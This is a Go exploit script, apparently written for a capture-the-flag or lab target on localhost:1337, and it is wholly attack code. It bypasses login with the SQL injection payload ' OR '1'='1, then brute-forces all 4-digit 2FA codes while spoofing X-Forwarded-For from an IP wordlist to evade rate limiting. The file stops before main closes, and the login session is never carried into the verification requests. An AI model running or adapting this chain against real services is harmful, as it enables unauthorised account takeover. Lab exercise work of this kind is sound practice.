package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strings"
)

const baseUrl = "http://localhost:1337" // Change this
const loginUrl = baseUrl + "/auth/logi%6e"
const verifyUrl = baseUrl + "/auth/verify-2fa"

const codesFp = "/usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt"                       // Change this
const ipv4sFp = "/usr/share/wordlists/seclists/Discovery/Infrastructure/All-Ipv4-ClassC-192.168.txt" // Change this

func readWordList(fp string) []string {
	file, err := os.Open(fp)
	if err != nil {
		panic(err)
	}

	defer file.Close()

	list := make([]string, 0)
	reader := bufio.NewReader(file)

	for {
		item, err := reader.ReadString('\n')
		if err != nil {
			break
		}

		list = append(list, strings.Trim(item, "\n"))
	}

	return list
}

func login() {
	// SQL injection
	payload := url.Values{
		"username": {"' OR '1'='1"},
		"password": {"' OR '1'='1"},
	}

	resp, err := http.PostForm(loginUrl, payload)
	if err != nil {
		panic(err)
	}

	resp.Body.Close()
}

func verify(code string, forwardedFor string) (bool, string) {
	payload := url.Values{"2fa-code": {code}}
	payloadBuffer := bytes.NewBuffer([]byte(payload.Encode()))

	req, err := http.NewRequest("POST", verifyUrl, payloadBuffer)
	if err != nil {
		panic(err)
	}

	// Bypass rate-limiter
	req.Header.Add("X-Forwarded-For", forwardedFor)
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

	// Storage for cookies
	jar, err := cookiejar.New(nil)
	if err != nil {
		panic(err)
	}

	client := &http.Client{
		Jar: jar,
	}

	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}

	defer resp.Body.Close()

	// 2FA code is invalid
	if resp.StatusCode == http.StatusBadRequest {
		return false, ""
	}

	// 2FA code is valid; Read response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}

	return true, string(body)
}

func main() {
	ipv4s := readWordList(ipv4sFp)
	codes := readWordList(codesFp)

	login()

	for i := 0; i < len(codes); i++ {
		verified, body := verify(codes[i], ipv4s[i])

		if verified {
			fmt.Println(body)
			break
		}
	}
